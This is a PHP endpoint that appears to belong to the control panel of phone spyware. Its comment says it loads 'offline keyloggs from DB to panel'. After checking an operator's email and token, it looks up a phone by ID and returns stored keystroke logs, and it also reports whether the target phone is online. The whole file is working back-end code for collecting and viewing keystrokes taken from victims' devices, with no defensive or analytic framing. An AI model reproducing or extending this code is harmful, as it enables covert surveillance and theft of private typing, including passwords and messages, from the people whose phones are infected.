<?php

//load offline keyloggs from DB to panel

require_once 'yarsap_14881.php';

$visitoraddress = getClientIP();
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


if (isSus($visitoraddress,'fetch_keylog') || isBlocked($visitoraddress)) {
    echo Format('Blocked',OP_Blocked);
    die();
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'));
   
    if (!empty($data->email) && !empty($data->token)) {


        try {
            $user_email = $data->email ?? 'empty';
            $user_token = $data->token ?? 'empty';
            $phone_id = $data->phoneid ?? 'empty';
            $activittime = urldecode($data->ktime);
       
           
            
            list($isValid, $message) = SessionCheck($user_email, $user_token);

            if (!$isValid) {

                echo Format("Authentication failed $message",OP_Fail);
                BadLogin($visitoraddress,'fetch_keylog');
                die();
            }

        

            $conn = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


            $stmt = $conn->prepare("SELECT * FROM users WHERE email = :email AND token = :token AND token_expiration >= NOW()");


             $stmt->bindParam(':email', $user_email);
            $stmt->bindParam(':token', $user_token);


            $stmt->execute();


            $result = $stmt->fetch(PDO::FETCH_ASSOC);


            if ($result) {

                $conn2 =  new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

                $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $checkOnlineQuery = "SELECT isonline FROM phones WHERE phone_id = :pid";
                $stmt1 = $conn2->prepare($checkOnlineQuery);
                $stmt1->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                $stmt1->execute();

  
                $isonline = $stmt1->fetchColumn();

                if ($isonline === false) {
                 
                    echo Format("Phone Not Found !",OP_Fail);
                    BadLogin($visitoraddress,'fetch_keylog');
                    exit;
                }



                $updateQuery = "SELECT klog_data FROM keylogs WHERE phone_id = :pid AND klog_time = :ktime";

                $stmt = $conn->prepare($updateQuery);
                $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                $stmt->bindParam(':ktime', $activittime, PDO::PARAM_STR);
                $stmt->execute();
                
                
                $result = $stmt->fetch(PDO::FETCH_ASSOC);
                
                
                if ($result && !empty($result['klog_data'])) {
                    echo Format($result['klog_data'], OP_Success);
                } else {
                    if ($isonline != 1) {
                        echo Format("Phone is not online",OP_Fail);
                    }else{
                        echo Format("HOLD", OP_Request);
                    }
                   
                }

                exit();

            } else {
               
                
                echo Format("Invalid or expired token.",OP_Fail);
                BadLogin($visitoraddress,'fetch_keylog');
            }
        } catch (PDOException $e) {
            echo Format("Error: " . "Something went wrong , please try again later",OP_Fail);
            logError($e);
            BadLogin($visitoraddress,'fetch_keylog');
        }
        $conn = null;
    } else {
       
        echo Format( "Missing email or token data.",OP_Fail);
        BadLogin($visitoraddress,'fetch_keylog');
    }
} else {
   
    echo Format("Invalid request.",OP_Fail);
    BadLogin($visitoraddress,'fetch_keylog');
}
?>